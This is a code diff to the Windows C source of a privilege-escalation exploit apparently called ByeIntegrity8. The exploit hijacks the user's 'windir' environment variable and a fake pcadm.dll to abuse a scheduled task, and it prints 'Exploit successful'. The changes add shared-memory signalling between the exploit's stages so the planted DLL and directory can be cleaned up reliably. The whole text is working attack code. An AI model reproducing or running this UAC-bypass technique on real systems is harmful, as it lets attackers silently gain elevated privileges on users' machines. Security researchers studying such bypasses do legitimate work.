@@ -232,13 +232,36 @@ int wmain(
 	if (argv[0][0] == L'L')
 		return BiWndClassTriggerMain();
 	if (argv[0][0] == L'S') {
-		HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE |
+		HRESULT hr;
+		HANDLE hSharedMemory;
+		PUCHAR exeName = NULL;
+
+		hSharedMemory = OpenFileMappingW(FILE_MAP_WRITE, FALSE, L"ByeIntegrity8");
+		if (!hSharedMemory) {
+			hr = HRESULT_FROM_WIN32(GetLastError());
+			goto end;
+		}
+
+		exeName = MapViewOfFile(hSharedMemory, FILE_MAP_WRITE, 0, 0, 0);
+		if (!exeName) {
+			hr = HRESULT_FROM_WIN32(GetLastError());
+			goto end;
+		}
+
+		hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE |
 			COINIT_SPEED_OVER_MEMORY);
 		if (!SUCCEEDED(hr))
-			return (int)hr;
-		Sleep(1000);
+			goto end;
+
 		hr = BiStopWdiTask(FALSE);
+		*(PBOOLEAN)(exeName + sizeof(BOOLEAN)) = TRUE;
 		CoUninitialize();
+
+end:
+		if (exeName)
+			UnmapViewOfFile(exeName);
+		if (hSharedMemory)
+			CloseHandle(hSharedMemory);
 		return (int)hr;
 	}
 
@@ -338,7 +361,7 @@ int wmain(
 	}
 
 	hSharedMem = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE,
-		0, ((wcslen(argv[0]) + 1) * sizeof(WCHAR)) + sizeof(BOOLEAN), L"ByeIntegrity8");
+		0, ((wcslen(argv[0]) + 1) * sizeof(WCHAR)) + (sizeof(BOOLEAN) * 2), L"ByeIntegrity8");
 	if (!hSharedMem) {
 		HeapFree(GetProcessHeap(), 0, curDir);
 		wprintf(L"CreateFileMappingW() failed. Error: %lu\n", GetLastError());
@@ -351,7 +374,7 @@ int wmain(
 		wprintf(L"MapViewOfFile() failed. Error: %lu\n", GetLastError());
 		goto eof;
 	}
-	memcpy(pSharedMem + sizeof(BOOLEAN), argv[0], (wcslen(argv[0]) + 1) * sizeof(WCHAR));
+	memcpy(pSharedMem + (sizeof(BOOLEAN) * 2), argv[0], (wcslen(argv[0]) + 1) * sizeof(WCHAR));
 
 	status = RegSetKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir", REG_SZ, curDir,
 		curDirSize * sizeof(WCHAR));
@@ -421,7 +444,13 @@ eofEarly:
 		_putws(L"[$] Exploit successful\n");
 		exitCode = 0;
 	}
-	Sleep(2500); // allow taskhostw.exe to end so we can cleanup fake pcadm.dll & system32 directory
+	for (int i = 0; i <= 2000; ++i) {
+		if (*(PBOOLEAN)(pSharedMem + sizeof(BOOLEAN)) == TRUE) {
+			break;
+		}
+		Sleep(10);
+	}
+	//Sleep(2500); // allow taskhostw.exe to end so we can cleanup fake pcadm.dll & system32 directory
 
 eof:
 	if (processInfo.hThread)
